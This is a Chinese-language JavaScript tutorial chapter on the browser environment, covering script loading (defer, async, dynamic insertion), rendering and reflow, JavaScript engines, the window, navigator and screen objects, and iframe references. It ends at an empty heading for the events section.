## 八.浏览器环境

### 1.浏览器环境概述

#### 1.JavaScript 代码嵌入网页的方法

JavaScript 代码只有嵌入网页，才能在用户浏览网页时运行。

网页中嵌入 JavaScript 代码，主要有四种方法。

---

- `<script>`标签：代码嵌入网页
- `<script>`标签：加载外部脚本
- 事件属性：代码写入 HTML 元素的事件处理属性，比如`onclick`或者`onmouseover`
- URL 协议：URL 支持以`javascript:`协议的方式，执行 JavaScript 代码

---

后两种方法用得很少，常用的是前两种方法。由于内容（HTML 代码）和行为代码（JavaScript）应该分离，所以第一种方法应当谨慎使用。

##### 1.1 script 标签：代码嵌入网页

通过`<script>`标签，可以直接将 JavaScript 代码嵌入网页。

```javascript
<script>console.log('Hello World');</script>
```

`<script>`标签有一个`type`属性，用来指定脚本类型。对 JavaScript 脚本来说，`type`属性可以设为两种值。

---

- `text/javascript`：这是默认值，也是历史上一贯设定的值。如果你省略`type`属性，默认就是这个值。对于老式浏览器，设为这个值比较好。
- `application/javascript`：对于较新的浏览器，建议设为这个值。

---

```javascript
<script type="application/javascript">console.log('Hello World');</script>
```

由于`<script>`标签默认就是 JavaScript 代码。所以，嵌入 JavaScript 脚本时，`type`属性也可以省略。

如果`type`属性的值，浏览器不认识，那么它不会执行其中的代码。利用这一点，可以在`<script>`标签之中嵌入任意的文本内容，然后加上一个浏览器不认识的`type`属性即可。

```javascript
<script id="mydata" type="x-custom-data">
  console.log('Hello World');
</script>
```

上面的代码，浏览器不会执行，也不会显示它的内容，因为不认识它的`type`属性。但是，这个`<script>`节点依然存在于 DOM 之中，可以使用`<script>`节点的 text 属性读出它的内容。

```javascript
document.getElementById("mydata").text;
// "
//   console.log('Hello World');
// "
```

##### 1.2 script 标签：加载外部脚本

`<script>`标签也可以指定加载外部的脚本文件。

`<script src="example.js"></script>`

如果脚本文件使用了非英语字符，还应该注明编码。

`<script charset="utf-8" src="example.js"></script>`

所加载的脚本必须是纯的 JavaScript 代码，不能有 HTML 代码和`<script>`标签。

加载外部脚本和直接添加代码块，这两种方法不能混用。下面代码的`console.log`语句直接被忽略。

```javascript
<script charset="utf-8" src="example.js">
  console.log('Hello World!');
</script>
```

为了防止攻击者篡改外部脚本，`script`标签允许设置一个`integrity`属性，写入该外部脚本的`Hash`签名，用来验证脚本的一致性。

```javascript
<script
  src="/assets/application.js"
  integrity="sha256-TvVUHzSfftWg1rcfL6TIJ0XKEGrgLyEq6lEpcmrG9qs="
/>
```

上面代码中，script 标签有一个`integrity`属性，指定了外部脚本`/assets/application.js`的 `SHA256` 签名。一旦有人改了这个脚本，导致 `SHA256` 签名不匹配，浏览器就会拒绝加载。

##### 1.3 事件属性

某些 HTML 元素的事件属性（比如`onclick`和`onmouseover`），可以写入 JavaScript 代码。当指定事件发生时，就会调用这些代码。

`<div onclick="alert('Hello')"></div>`

上面的事件属性代码只有一个语句。如果有多个语句，用分号分隔即可。

##### 1.4 URL 协议

URL 支持`javascript:`协议，调用这个 URL 时，就会执行 JavaScript 代码。

`<a href="javascript:alert('Hello')"></a>`

浏览器的地址栏也可以执行`javascipt:`协议。将`javascript:alert('Hello')`放入地址栏，按回车键，就会跳出提示框。

如果 JavaScript 代码返回一个字符串，浏览器就会新建一个文档，展示这个字符串的内容，原有文档的内容都会消失。

```javascript
<a href="javascript:new Date().toLocaleTimeString();">What time is it?</a>
```

上面代码中，用户点击链接以后，会打开一个新文档，里面有当前时间。

如果返回的不是字符串，那么浏览器不会新建文档，也不会跳转。

```javascript
<a href="javascript:console.log(new Date().toLocaleTimeString())">
  What time is it?
</a>
```

上面代码中，用户点击链接后，网页不会跳转，只会在控制台显示当前时间。

`javascript:`协议的常见用途是书签脚本`Bookmarklet`。由于浏览器的书签保存的是一个网址，所以`javascript:`网址也可以保存在里面，用户选择这个书签的时候，就会在当前页面执行这个脚本。为了防止书签替换掉当前文档，可以在脚本最后返回`void 0`。

#### 2.script 标签

##### 2.1 工作原理

浏览器加载 JavaScript 脚本，主要通过`<script>`标签完成。正常的网页加载流程是这样的。

---

- a.浏览器一边下载 HTML 网页，一边开始解析
- b.解析过程中，发现`<script>`标签
- c.暂停解析，网页渲染的控制权转交给 JavaScript 引擎
- d.如果`<script>`标签引用了外部脚本，就下载该脚本，否则就直接执行
- e.执行完毕，控制权交还渲染引擎，恢复往下解析 HTML 网页

---

加载外部脚本时，浏览器会暂停页面渲染，等待脚本下载并执行完成后，再继续渲染。原因是 JavaScript 可以修改 DOM（比如使用`document.write`方法），所以必须把控制权让给它，否则会导致复杂的线程竞赛的问题。

如果外部脚本加载时间很长（比如一直无法完成下载），就会造成网页长时间失去响应，浏览器就会呈现“假死”状态，这被称为“阻塞效应”。

为了避免这种情况，较好的做法是将`<script>`标签都放在页面底部，而不是头部。这样即使遇到脚本失去响应，网页主体的渲染也已经完成了，用户至少可以看到内容，而不是面对一张空白的页面。

如果某些脚本代码非常重要，一定要放在页面头部的话，最好直接将代码嵌入页面，而不是连接外部脚本文件，这样能缩短加载时间。

将脚本文件都放在网页尾部加载，还有一个好处。在 DOM 结构生成之前就调用 DOM，JavaScript 会报错，如果脚本都在网页尾部加载，就不存在这个问题，因为这时 DOM 肯定已经生成了。

```javascript
<head>
  <script>
    console.log(document.body.innerHTML);
  </script>
</head>
<body>
</body>
```

上面代码执行时会报错，因为此时`document.body`元素还未生成。

一种解决方法是设定`DOMContentLoaded`事件的回调函数。

```javascript
<head>
  <script>
    document.addEventListener(
      'DOMContentLoaded',
      function (event) {
        console.log(document.body.innerHTML);
      }
    );
  </script>
</head>
```

另一种解决方法是，使用`<script>`标签的`onload`属性。当`<script>`标签指定的外部脚本文件下载和解析完成，会触发一个`load`事件，可以把所需执行的代码，放在这个事件的回调函数里面。

```javascript
<script src="jquery.min.js" onload="console.log(document.body.innerHTML)" />
```

但是，如果将脚本放在页面底部，就可以完全按照正常的方式写，上面两种方式都不需要。

```javascript
<body>
  <!-- 其他代码  -->
  <script>
    console.log(document.body.innerHTML);
  </script>
</body>
```

如果有多个`script`标签，比如下面这样。

```javascript
<script src="a.js"></script>
<script src="b.js"></script>
```

浏览器会同时并行下载 a.js 和 b.js，但是，执行时会保证先执行 a.js，然后再执行 b.js，即使后者先下载完成，也是如此。也就是说，脚本的执行顺序由它们在页面中的出现顺序决定，这是为了保证脚本之间的依赖关系不受到破坏。当然，加载这两个脚本都会产生“阻塞效应”，必须等到它们都加载完成，浏览器才会继续页面渲染。

> Gecko 和 Webkit 引擎在网页被阻塞后，会生成第二个线程解析文档，下载外部资源，但是不会修改 DOM，网页还是处于阻塞状态。

解析和执行 CSS，也会产生阻塞。Firefox 会等到脚本前面的所有样式表，都下载并解析完，再执行脚本；Webkit 则是一旦发现脚本引用了样式，就会暂停执行脚本，等到样式表下载并解析完，再恢复执行。

此外，对于来自同一个域名的资源，比如脚本文件、样式表文件、图片文件等，浏览器一般最多同时下载六个（IE11 允许同时下载 13 个）。如果是来自不同域名的资源，就没有这个限制。所以，通常把静态文件放在不同的域名之下，以加快下载速度。

##### 2.2 defer 属性

为了解决脚本文件下载阻塞网页渲染的问题，一个方法是加入`defer`属性。

```javascript
<script src="a.js" defer></script>
<script src="b.js" defer></script>
```

上面代码中，只有等到 DOM 加载完成后，才会执行 a.js 和 b.js。

`defer`的运行流程如下。

---

- a.浏览器开始解析 HTML 网页
- b.解析过程中，发现带有`defer`属性的`script`标签
- c.浏览器继续往下解析 HTML 网页，同时并行下载`script`标签中的外部脚本
- d.浏览器完成解析 HTML 网页，此时再执行下载的脚本

---

有了`defer`属性，浏览器下载脚本文件的时候，不会阻塞页面渲染。下载的脚本文件在`DOMContentLoaded`事件触发前执行（即刚刚读取完`</html>`标签），而且可以保证执行顺序就是它们在页面上出现的顺序。

对于内置而不是加载外部脚本的`script`标签，以及动态生成的`script`标签，`defer`属性不起作用。另外，使用`defer`加载的外部脚本不应该使用`document.write`方法。

##### 2.3 async 属性

解决“阻塞效应”的另一个方法是加入`async`属性。

```javascript
<script src="a.js" async></script>
<script src="b.js" async></script>
```

`async`属性的作用是，使用另一个进程下载脚本，下载时不会阻塞渲染。

---

- a.浏览器开始解析 HTML 网页
- b.解析过程中，发现带有`async`属性的`script`标签
- c.浏览器继续往下解析 HTML 网页，同时并行下载`script`标签中的外部脚本
- d.脚本下载完成，浏览器暂停解析 HTML 网页，开始执行下载的脚本
- e.脚本执行完毕，浏览器恢复解析 HTML 网页

---

`async`属性可以保证脚本下载的同时，浏览器继续渲染。需要注意的是，一旦采用这个属性，就无法保证脚本的执行顺序。哪个脚本先下载结束，就先执行那个脚本。另外，使用`async`属性的脚本文件中，不应该使用`document.write`方法。

`defer`属性和`async`属性到底应该使用哪一个？

一般来说，如果脚本之间没有依赖关系，就使用`async`属性，如果脚本之间有依赖关系，就使用`defer`属性。如果同时使用`async`和`defer`属性，后者不起作用，浏览器行为由`async`属性决定。

##### 2.4 脚本的动态加载

除了静态的`script`标签，还可以动态生成`script`标签，然后加入页面，从而实现脚本的动态加载。

```javascript
["a.js", "b.js"].forEach(function(src) {
  var script = document.createElement("script");
  script.src = src;
  document.head.appendChild(script);
});
```

这种方法的好处是，动态生成的`script`标签不会阻塞页面渲染，也就不会造成浏览器假死。但是问题在于，这种方法无法保证脚本的执行顺序，哪个脚本文件先下载完成，就先执行哪个。

如果想避免这个问题，可以设置`async`属性为 false。

```javascript
["a.js", "b.js"].forEach(function(src) {
  var script = document.createElement("script");
  script.src = src;
  script.async = false;
  document.head.appendChild(script);
});
```

上面的代码依然不会阻塞页面渲染，而且可以保证 b.js 在 a.js 后面执行。不过需要注意的是，在这段代码后面加载的脚本文件，会因此都等待 b.js 执行完成后再执行。

我们可以把上面的写法，封装成一个函数。

```javascript
(function() {
  var scripts = document.getElementsByTagName("script")[0];
  function load(url) {
    var script = document.createElement("script");
    script.async = true;
    script.src = url;
    scripts.parentNode.insertBefore(script, scripts);
  }
  load("//apis.google.com/js/plusone.js");
  load("//platform.twitter.com/widgets.js");
  load("//s.thirdpartywidget.com/widget.js");
})();
```

上面代码中，`async`属性设为 true，是因为加载的脚本没有互相依赖关系。而且，这样就不会造成堵塞。

如果想为动态加载的脚本指定回调函数，可以使用下面的写法。

```javascript
function loadScript(src, done) {
  var js = document.createElement("script");
  js.src = src;
  js.onload = function() {
    done();
  };
  js.onerror = function() {
    done(new Error("Failed to load script " + src));
  };
  document.head.appendChild(js);
}
```

此外，动态嵌入还有一个地方需要注意。动态嵌入必须等待 CSS 文件加载完成后，才会去下载外部脚本文件。静态加载就不存在这个问题，`script`标签指定的外部脚本文件，都是与 CSS 文件同时并发下载的。

##### 2.5 加载使用的协议

如果不指定协议，浏览器默认采用 HTTP 协议下载。

`<script src="example.js"></script>`

上面的 example.js 默认就是采用 HTTP 协议下载，如果要采用 HTTPS 协议下载，必需写明（假定服务器支持）。

`<script src="https://example.js"></script>`

但是有时我们会希望，根据页面本身的协议来决定加载协议，这时可以采用下面的写法。

`<script src="//example.js"></script>`

#### 3.浏览器的组成

浏览器的核心是两部分：渲染引擎和 JavaScript 解释器（又称 JavaScript 引擎）。

##### 3.1 渲染引擎

渲染引擎的主要作用是，将网页代码渲染为用户视觉可以感知的平面文档。

不同的浏览器有不同的渲染引擎。

---

- Firefox：Gecko 引擎
- Safari：WebKit 引擎
- Chrome：Blink 引擎(基于 WebKit 的 fork Web 渲染引擎)
- Opera：Presto 引擎
- IE: Trident 引擎
- Edge: EdgeHTML 引擎

---

渲染引擎处理网页，通常分成四个阶段。

---

- a.解析代码：HTML 代码解析为 DOM，CSS 代码解析为 CSSOM（CSS Object Model）
- b.对象合成：将 DOM 和 CSSOM 合成一棵渲染树（render tree）
- c.布局：计算出渲染树的布局（layout）
- d.绘制：将渲染树绘制到屏幕

---

以上四步并非严格按顺序执行，往往第一步还没完成，第二步和第三步就已经开始了。所以，会看到这种情况：网页的 HTML 代码还没下载完，但浏览器已经显示出内容了。

##### 3.2 重流和重绘

渲染树转换为网页布局，称为**布局流（flow）**；布局显示到页面的这个过程，称为**绘制（paint）**。它们都具有阻塞效应，并且会耗费很多时间和计算资源。

页面生成以后，脚本操作和样式表操作，都会触发重流**（reflow）**和**重绘（repaint）**。用户的互动，也会触发，比如设置了鼠标悬停（`a:hover`）效果、页面滚动、在输入框中输入文本、改变窗口大小等等。

重流和重绘并不一定一起发生，重流必然导致重绘，重绘不一定需要重流。比如改变元素颜色，只会导致重绘，而不会导致重流；改变元素的布局，则会导致重绘和重流。

大多数情况下，浏览器会智能判断，将重流和重绘只限制到相关的子树上面，最小化所耗费的代价，而不会全局重新生成网页。

作为开发者，应该尽量设法降低重绘的次数和成本。比如，尽量不要变动高层的 DOM 元素，而以底层 DOM 元素的变动代替；再比如，重绘`table`布局和`flex`布局，开销都会比较大。

```javascript
var foo = document.getElementById("foobar");

foo.style.color = "blue";
foo.style.marginTop = "30px";
```

上面的代码只会导致一次重绘，因为浏览器会累积 DOM 变动，然后一次性执行。

下面是一些优化技巧。

---

- a.读取 DOM 或者写入 DOM，尽量写在一起，不要混杂
- b.缓存 DOM 信息
- c.不要一项一项地改变样式，而是使用`CSS class`一次性改变样式
- d.使用`document fragment`操作 DOM
- e.动画时使用`absolute`定位或`fixed`定位，这样可以减少对其他元素的影响
- f.只在必要时才显示元素
- g.使用`window.requestAnimationFrame()`，因为它可以把代码推迟到下一次重流时执行，而不是立即要求页面重流
- e.使用虚拟 DOM（virtual DOM）库

---

下面是一个`window.requestAnimationFrame()`对比效果的例子。

```javascript
// 重绘代价高
function doubleHeight(element) {
  var currentHeight = element.clientHeight;
  element.style.height = currentHeight * 2 + "px";
}

all_my_elements.forEach(doubleHeight);

// 重绘代价低
function doubleHeight(element) {
  var currentHeight = element.clientHeight;

  window.requestAnimationFrame(function() {
    element.style.height = currentHeight * 2 + "px";
  });
}

all_my_elements.forEach(doubleHeight);
```

##### 3.3 JavaScript 引擎

JavaScript 引擎的主要作用是，读取网页中的 JavaScript 代码，对其处理后运行。

JavaScript 是一种解释型语言，也就是说，它不需要编译，由解释器实时运行。这样的好处是运行和修改都比较方便，刷新页面就可以重新解释；缺点是每次运行都要调用解释器，系统开销较大，运行速度慢于编译型语言。

为了提高运行速度，目前的浏览器都将 JavaScript 进行一定程度的编译，生成类似字节码（bytecode）的中间代码，以提高运行速度。

早期，浏览器内部对 JavaScript 的处理过程如下：

---

- a.读取代码，进行词法分析（Lexical analysis），将代码分解成词元（token）。
- b.对词元进行语法分析（parsing），将代码整理成“语法树”（syntax tree）。
- c.使用“翻译器”（translator），将代码转为字节码（bytecode）。
- d.使用“字节码解释器”（bytecode interpreter），将字节码转为机器码。

---

逐行解释将字节码转为机器码，是很低效的。为了提高运行速度，现代浏览器改为采用“**即时编译**”（Just In Time compiler，缩写 JIT），即字节码只在运行时编译，用到哪一行就编译哪一行，并且把编译结果缓存（inline cache）。通常，一个程序被经常用到的，只是其中一小部分代码，有了缓存的编译结果，整个程序的运行速度就会显著提升。不同的浏览器有不同的编译策略。有的浏览器只编译最经常用到的部分，比如循环的部分；有的浏览器索性省略了字节码的翻译步骤，直接编译成机器码，比如 chrome 浏览器的 V8 引擎。

字节码不能直接运行，而是运行在一个虚拟机（Virtual Machine）之上，一般也把虚拟机称为 JavaScript 引擎。因为 JavaScript 运行时未必有字节码，所以 JavaScript 虚拟机并不完全基于字节码，而是部分基于源码，即只要有可能，就通过 JIT（just in time）编译器直接把源码编译成机器码运行，省略字节码步骤。这一点与其他采用虚拟机（比如 Java）的语言不尽相同。这样做的目的，是为了尽可能地优化代码、提高性能。下面是目前最常见的一些 JavaScript 虚拟机：

---

- Chakra(Microsoft Internet Explorer)
- Nitro/JavaScript Core (Safari)
- Carakan (Opera)
- SpiderMonkey (Firefox)
- V8 (Chrome, Chromium)

---

### 2.window 对象

#### 1.概述

在浏览器中，`window`对象指当前的浏览器窗口。它也是所有对象的顶层对象。

“顶层对象”指的是最高一层的对象，所有其他对象都是它的下属。JavaScript 规定，浏览器环境的所有全局变量，都是`window`对象的属性。

```javascript
var a = 1;
window.a; // 1
```

上面代码中，变量 a 是一个全局变量，但是实质上它是`window`对象的属性。声明一个全局变量，就是为`window`对象的同名属性赋值。

从语言设计的角度看，所有变量都是`window`对象的属性，其实不是很合理。因为`window`对象有自己的实体含义，不适合当作最高一层的顶层对象。这个设计失误与 JavaScript 语言匆忙的设计过程有关，最早的设想是语言内置的对象越少越好，这样可以提高浏览器的性能。因此，语言设计者 Brendan Eich 就把`window`对象当作顶层对象，所有未声明就赋值的变量都自动变成 window 对象的属性。这种设计使得编译阶段无法检测出未声明变量，但到了今天已经没有办法纠正了。

#### 2.window 对象的属性

##### 2.1 window.window，window.name

`window`对象的`window`属性指向自身。

`window.window === this // true`

`window.name`属性用于设置当前浏览器窗口的名字。

```javascript
window.name = "Hello World!";
console.log(window.name);
// "Hello World!"
```

各个浏览器对这个值的储存容量有所不同，但是一般来说，可以高达几 MB。

该属性只能保存字符串，且当浏览器窗口关闭后，所保存的值就会消失。因此局限性比较大，但是与`<iframe>`窗口通信时，非常有用。

##### 2.2 window.location

`window.location`返回一个`location`对象，用于获取窗口当前的 URL 信息。它等同于`document.location`对象。

`window.location === document.location // true`

##### 2.3 window.closed，window.opener

`window.closed`属性返回一个布尔值，表示窗口是否关闭。

`window.closed // false`

上面代码检查当前窗口是否关闭。这种检查意义不大，因为只要能运行代码，当前窗口肯定没有关闭。这个属性一般用来检查，使用脚本打开的新窗口是否关闭。

```javascript
var popup = window.open();

if (popup !== null && !popup.closed) {
  // 窗口仍然打开着
}
```

`window.opener`属性返回打开当前窗口的父窗口。如果当前窗口没有父窗口，则返回`null`。

`window.open().opener === window // true`

上面表达式会打开一个新窗口，然后返回 true。

通过`opener`属性，可以获得父窗口的的全局变量和方法，比如`window.opener.propertyName`和`window.opener.functionName()`。但这只限于两个窗口属于同源的情况，且其中一个窗口由另一个打开。

##### 2.4 window.frames，window.length

`window.frames`属性返回一个类似数组的对象，成员为页面内所有框架窗口，包括`frame`元素和`iframe`元素。`window.frames[0]`表示页面中第一个框架窗口。

如果`iframe`元素设置了`id`或`name`属性，那么就可以用属性值，引用这个`iframe`窗口。比如`<iframe name="myIFrame">`就可以用`frames['myIFrame']`或者`frames.myIFrame`来引用。

`frames`属性实际上是`window`对象的别名。

`frames === window // true`

因此，`frames[0]`也可以用`window[0]`表示。但是，从语义上看，`frames`更清晰，而且考虑到`window`还是全局对象，因此推荐表示多窗口时，总是使用`frames[0]`的写法。

`window.length`属性返回当前网页包含的框架总数。如果当前网页不包含`frame`和`iframe`元素，那么`window.length`就返回 0。

`window.frames.length === window.length // true`

`window.frames.length`与`window.length`应该是相等的。

##### 2.5 window.screenX，window.screenY

`window.screenX`和`window.screenY`属性，返回浏览器窗口左上角相对于当前屏幕左上角（(0, 0)）的水平距离和垂直距离，单位为像素。

##### 2.6 window.innerHeight，window.innerWidth

`window.innerHeight`和`window.innerWidth`属性，返回网页在当前窗口中可见部分的高度和宽度，即“视口”（viewport），单位为像素。

当用户放大网页的时候（比如将网页从 100%的大小放大为 200%），这两个属性会变小。因为这时网页的像素大小不变（比如宽度还是 960 像素），只是每个像素占据的屏幕空间变大了，因为可见部分（视口）就变小了。

注意，这两个属性值包括滚动条的高度和宽度。

##### 2.7 window.outerHeight，window.outerWidth

`window.outerHeight`和`window.outerWidth`属性返回浏览器窗口的高度和宽度，包括浏览器菜单和边框，单位为像素。

##### 2.8 window.pageXOffset，window.pageYOffset

`window.pageXOffset`属性返回页面的水平滚动距离，`window.pageYOffset`属性返回页面的垂直滚动距离，单位都为像素。

举例来说，如果用户向下拉动了垂直滚动条 75 像素，那么`window.pageYOffset`就是 75。用户水平向右拉动水平滚动条 200 像素，`window.pageXOffset`就是 200。

#### 3.navigator 对象

`window`对象的`navigator`属性，指向一个包含浏览器信息的对象。

##### 3.1 navigator.userAgent

`navigator.userAgent`属性返回浏览器的`User-Agent`字符串，标示浏览器的厂商和版本信息。

下面是 Chrome 浏览器的`userAgent`。

```javascript
navigator.userAgent;
// "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"
```

通过`userAgent`属性识别浏览器，不是一个好办法。因为必须考虑所有的情况（不同的浏览器，不同的版本），非常麻烦，而且无法保证未来的适用性，更何况各种上网设备层出不穷，难以穷尽。所以，现在一般不再识别浏览器了，而是使用“功能识别”方法，即逐一测试当前浏览器是否支持要用到的 JavaScript 功能。

不过，通过`userAgent`可以大致准确地识别手机浏览器，方法就是测试是否包含 mobi 字符串。

```javascript
var ua = navigator.userAgent.toLowerCase();

if (/mobi/i.test(ua)) {
  // 手机浏览器
} else {
  // 非手机浏览器
}
```

如果想要识别所有移动设备的浏览器，可以测试更多的特征字符串。

`/mobi|android|touch|mini/i.test(ua)`

##### 3.2 navigator.plugins

`navigator.plugins`属性返回一个类似数组的对象，成员是浏览器安装的插件，比如 Flash、ActiveX 等。

##### 3.3 navigator.platform

`navigator.platform`属性返回用户的操作系统信息。

```javascript
navigator.platform;
// "Linux x86_64"
```

##### 3.4 navigator.onLine

`navigator.onLine`属性返回一个布尔值，表示用户当前在线还是离线。

`navigator.onLine // true`

##### 3.5 navigator.geolocation

`navigator.geolocation`返回一个 Geolocation 对象，包含用户地理位置的信息。

##### 3.6 navigator.javaEnabled()，navigator.cookieEnabled

javaEnabled 方法返回一个布尔值，表示浏览器是否能运行 Java Applet 小程序。

`navigator.javaEnabled() // false`

`cookieEnabled`属性返回一个布尔值，表示浏览器是否能储存`Cookie`。

`navigator.cookieEnabled // true`

注意，这个返回值与是否储存某个网站的`Cookie`无关。用户可以设置某个网站不得储存`Cookie`，这时`cookieEnabled`返回的还是 true。

#### 4.window.screen 对象

`window.screen`对象包含了显示设备的信息。

`screen.height`和`screen.width`两个属性，一般用来了解设备的分辨率。

```javascript
// 显示设备的高度，单位为像素
screen.height; // 1920

// 显示设备的宽度，单位为像素
screen.width; // 1080
```

上面代码显示，某设备的分辨率是 1920x1080。

除非调整显示器的分辨率，否则这两个值可以看作常量，不会发生变化。显示器的分辨率与浏览器设置无关，缩放网页并不会改变分辨率。

下面是根据屏幕分辨率，将用户导向不同网页的代码。

```javascript
if (screen.width <= 800 && screen.height <= 600) {
  window.location.replace("small.html");
} else {
  window.location.replace("wide.html");
}
```

`screen.availHeight`和`screen.availWidth`属性返回屏幕可用的高度和宽度，单位为像素。它们的值为屏幕的实际大小减去操作系统某些功能占据的空间，比如系统的任务栏。

`screen.colorDepth`属性返回屏幕的颜色深度，一般为 16（表示 16-bit）或 24（表示 24-bit）。

#### 5.window 对象的方法

##### 5.1 window.moveTo()，window.moveBy()

`window.moveTo`方法用于移动浏览器窗口到指定位置。它接受两个参数，分别是窗口左上角距离屏幕左上角的水平距离和垂直距离，单位为像素。

`window.moveTo(100, 200)`

上面代码将窗口移动到屏幕(100, 200)的位置。

`window.moveBy`方法将窗口移动到一个相对位置。它接受两个参数，分布是窗口左上角向右移动的水平距离和向下移动的垂直距离，单位为像素。

`window.moveBy(25, 50)`

上面代码将窗口向右移动 25 像素、向下移动 50 像素。

##### 5.2 window.scrollTo()，window.scrollBy()

`window.scrollTo`方法用于将网页的指定位置，滚动到浏览器左上角。它的参数是相对于整张网页的横坐标和纵坐标。它有一个别名`window.scroll`。

`window.scrollTo(0, 1000);`

`window.scrollBy`方法用于将网页移动指定距离，单位为像素。它接受两个参数：向右滚动的像素，向下滚动的像素。

`window.scrollBy(0, window.innerHeight)`

上面代码用于将网页向下滚动一屏。

##### 5.3 window.open(), window.close()

`window.open`方法用于新建另一个浏览器窗口，并且返回该窗口对象。

`var popup = window.open('somefile.html');`

上面代码会让浏览器弹出一个新建窗口，网址是当前域名下的`somefile.html`。

`open`方法一共可以接受四个参数。

---

- 第一个参数：字符串，表示新窗口的网址。如果省略，默认网址就是`about:blank`。

---

- 第二个参数：字符串，表示新窗口的名字。如果该名字的窗口已经存在，则跳到该窗口，不再新建窗口。如果省略，就默认使用`_blank`，表示新建一个没有名字的窗口。

---

- 第三个参数：字符串，内容为逗号分隔的键值对，表示新窗口的参数，比如有没有提示栏、工具条等等。如果省略，则默认打开一个完整 UI 的新窗口。

---

- 第四个参数：布尔值，表示第一个参数指定的网址，是否应该替换`history`对象之中的当前网址记录，默认值为 false。显然，这个参数只有在第二个参数指向已经存在的窗口时，才有意义。

---

下面是一个例子。

```javascript
var popup = window.open(
  "somepage.html",
  "DefinitionsWindows",
  "height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes"
);
```

上面代码表示，打开的新窗口高度和宽度都为 200 像素，没有地址栏和滚动条，但有状态栏，允许用户调整大小。

注意，如果在第三个参数中设置了一部分参数，其他没有被设置的 yes/no 参数都会被设成 no，只有`titlebar`和关闭按钮除外（它们的值默认为 yes）。

另外，`open`方法的第二个参数虽然可以指定已经存在的窗口，但是不等于可以任意控制其他窗口。为了防止被不相干的窗口控制，浏览器只有在两个窗口同源，或者目标窗口被当前网页打开的情况下，才允许`open`方法指向该窗口。

`open`方法返回新窗口的引用。

```javascript
var windowB = window.open("windowB.html", "WindowB");
windowB.window.name; // "WindowB"
```

下面是另一个例子。

```javascript
var w = window.open();
w.alert("已经打开新窗口");
w.location = "http://example.com";
```

上面代码先打开一个新窗口，然后在该窗口弹出一个对话框，再将网址导向 example.com。

由于`open`这个方法很容易被滥用，许多浏览器默认都不允许脚本自动新建窗口。只允许在用户点击链接或按钮，脚本做出反应，弹出新窗口。因此，有必要检查一下打开新窗口是否成功。

```javascript
if (popup === null) {
  // 新建窗口失败
}
```

`window.close`方法用于关闭当前窗口，一般用来关闭`window.open`方法新建的窗口。

`popup.close()`

该方法只对顶层窗口有效，`iframe`框架之中的窗口使用该方法无效。

##### 5.4 window.print()

`print`方法会跳出打印对话框，同用户点击菜单里面的“打印”命令效果相同。

页面上的打印按钮代码如下。

```javascript
document.getElementById("printLink").onclick = function() {
  window.print();
};
```

非桌面设备（比如手机）可能没有打印功能，这时可以这样判断。

```javascript
if (typeof window.print === "function") {
  // 支持打印功能
}
```

##### 5.5 window.getComputedStyle()

`getComputedStyle`方法接受一个 HTML 元素作为参数，返回一个包含该 HTML 元素的最终样式信息的对象。

##### 5.6 window.matchMedia()

`window.matchMedia`方法用来检查 CSS 的`mediaQuery`语句。

##### 5.7 window.focus()

`focus`方法会激活指定当前窗口，使其获得焦点。

```javascript
var popup = window.open("popup.html", "Popup Window");

if (popup !== null && !popup.closed) {
  popup.focus();
}
```

上面代码先检查`popup`窗口是否依然存在，确认后激活该窗口。

当前窗口获得焦点时，会触发`focus`事件；当前窗口失去焦点时，会触发`blur`事件。

##### 5.8 window.getSelection()

`window.getSelection`方法返回一个`Selection`对象，表示用户现在选中的文本。

`var selObj = window.getSelection();`

使用`Selction`对象的`toString`方法可以得到选中的文本。

`var selectedText = selObj.toString();`

#### 6.多窗口操作

由于网页可以使用`iframe`元素，嵌入其他网页，因此一个网页之中会形成多个窗口。另一情况是，子网页之中又嵌入别的网页，形成多级窗口。

##### 6.1 窗口的引用

各个窗口之中的脚本，可以引用其他窗口。浏览器提供了一些特殊变量，用来返回其他窗口。

---

- top：顶层窗口，即最上层的那个窗口
- parent：父窗口
- self：当前窗口，即自身

---

下面代码可以判断，当前窗口是否为顶层窗口。

```javascript
top === self;

// 更好的写法
window.top === window.self;
```

下面的代码让父窗口的访问历史后退一次。

`parent.history.back();`

与这些变量对应，浏览器还提供一些特殊的窗口名，供`open`方法、`<a>`标签、`<form>`标签等引用。

---

\_top：顶层窗口
\_parent：父窗口
\_blank：新窗口

---

下面代码就表示在顶层窗口打开链接。

`<a href="somepage.html" target="_top">Link</a>`

##### 6.2 iframe 标签

对于`iframe`嵌入的窗口，`document.getElementById`方法可以拿到该窗口的 DOM 节点，然后使用`contentWindow`属性获得`iframe`节点包含的`window`对象，或者使用`contentDocument`属性获得包含的`document`对象。

```javascript
var frame = document.getElementById("theFrame");
var frameWindow = frame.contentWindow;

// 等同于 frame.contentWindow.document
var frameDoc = frame.contentDocument;

// 获取子窗口的变量和属性
frameWindow.function();

// 获取子窗口的标题
frameWindow.title;
```

`iframe`元素遵守同源政策，只有当父页面与框架页面来自同一个域名，两者之间才可以用脚本通信，否则只有使用`window.postMessage`方法。

`iframe`窗口内部，使用`window.parent`引用父窗口。如果当前页面没有父窗口，则`window.parent`属性返回自身。因此，可以通过`window.parent`是否等于`window.self`，判断当前窗口是否为`iframe`窗口。

```javascript
if (window.parent !== window.self) {
  // 当前窗口是子窗口
}
```

`iframe`嵌入窗口的`window`对象，有一个`frameElement`属性，返回它在父窗口中的 DOM 节点。对于那么非嵌入的窗口，该属性等于`null`。

```javascript
var f1Element = document.getElementById("f1");
var fiWindow = f1Element.contentWindow;
f1Window.frameElement === f1Element; // true
window.frameElement === null; // true
```

##### 6.3 frames 属性

`window`对象的`frames`属性返回一个类似数组的对象，成员是所有子窗口的`window`对象。可以使用这个属性，实现窗口之间的互相引用。比如，`frames[0]`返回第一个子窗口，`frames[1].frames[2]`返回第二个子窗口内部的第三个子窗口，`parent.frames[1]`返回父窗口的第二个子窗口。

需要注意的是，`window.frames`每个成员的值，是框架内的窗口（即框架的`window`对象），而不是`iframe`标签在父窗口的 DOM 节点。如果要获取每个框架内部的 DOM 树，需要使用`window.frames[0].document`的写法。

另外，如果`iframe`元素设置了`name`或`id`属性，那么属性值会自动成为全局变量，并且可以通过`window.frames`属性引用，返回子窗口的`window`对象。

```javascript
// HTML代码为<iframe id="myFrame">
myFrame; // [HTMLIFrameElement]
frames.myframe === myFrame; // true
```

另外，`name`属性的值会自动成为子窗口的名称，可以用在`window.open`方法的第二个参数，或者`<a>`和`<frame>`标签的`target`属性。

#### 7.事件

